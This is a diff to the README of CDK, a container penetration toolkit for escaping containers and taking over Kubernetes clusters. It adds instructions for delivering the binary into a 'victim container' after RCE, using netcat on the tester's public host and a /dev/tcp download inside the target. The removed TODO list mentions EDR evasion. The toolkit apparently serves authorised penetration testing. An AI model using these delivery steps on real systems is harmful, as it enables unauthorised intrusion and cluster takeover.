@@ -14,13 +14,29 @@ CDK is for security testing purposes only.
 
 CDK is an open-sourced container penetration toolkit, designed for offering stable exploitation in different slimmed containers without any OS dependency. It comes with useful net-tools and many powerful PoCs/EXPs helps you to escape container and takeover K8s cluster easily.
 
-Currently still under development, submit [issues](https://github.com/cdk-team/CDK/issues) or mail <i@cdxy.me> if you need any help.
+## Installation/Delivery
 
-## Installation
+Download latest release in https://github.com/cdk-team/CDK/releases/
 
-Download latest release in: https://github.com/cdk-team/CDK/releases/
+Drop executable files into the target container and start testing.
 
-Drop executable files into target container and start testing.
+### TIPS: Deliver CDK into target container in real-world penetration testing
+
+If you have an exploit that can upload a file, then you can upload CDK binary directly.
+
+If you have an RCE exploit, but the target container has no `curl` or `wget`, you can use the following method to deliver CDK:
+
+1. First, host CDK binary on your host with public IP.
+```
+(on your host)
+nc -lvp 999 < cdk
+```
+
+2. Inside the victim container execute
+```
+cat < /dev/tcp/(your_public_host_ip)/(port) > cdk
+chmod a+x cdk
+```
 
 ## Usage
 ```
@@ -176,13 +192,6 @@ New feature or exploits:
 * Please enable a sustainable environment for us to review contributions.
 * Screenshots about how this new feature works.
 * If you are committing a new evaluate/exploit scripts, please add a simple doc to your PR message, here is an [example](https://github.com/cdk-team/CDK/wiki/Exploit:-docker-sock-deploy).
-
-## TODO
-
-1. Echo loader for delivering CDK into target container via Web RCE.
-2. EDR defense evasion.
-3. Compile optimization.
-4. Dev docs
 
 ## Events
 
